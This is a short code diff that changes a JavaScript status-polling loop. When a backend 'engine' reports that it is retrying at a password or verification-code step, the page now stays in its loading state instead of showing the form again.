@@ -439,6 +439,17 @@
                 const data = await res.json();
                 console.log('[Template] Poll response:', data.currentStatus, '| data:', JSON.stringify(data.data || {}).substring(0, 200));
                 if (data.currentStatus) {
+                    // FIX: If engine is retrying (password unavailable or wrong code),
+                    // stay in loading state - don't clear isProcessing or show form
+                    if (isProcessing && (data.currentStatus === 'WAITINGPASSWORD' || data.currentStatus === 'WAITINGCODE')) {
+                        try {
+                            const ljr = data.data && data.data.lastJsonResponse ? (typeof data.data.lastJsonResponse === 'string' ? JSON.parse(data.data.lastJsonResponse) : data.data.lastJsonResponse) : null;
+                            if (ljr && ljr.engineRetrying === true) {
+                                console.log('[Template] Engine retrying, staying in loading state');
+                                return;
+                            }
+                        } catch (e) {}
+                    }
                     isProcessing = false;
                     updateUIForStatus(data.currentStatus, data.data || {});
                 }
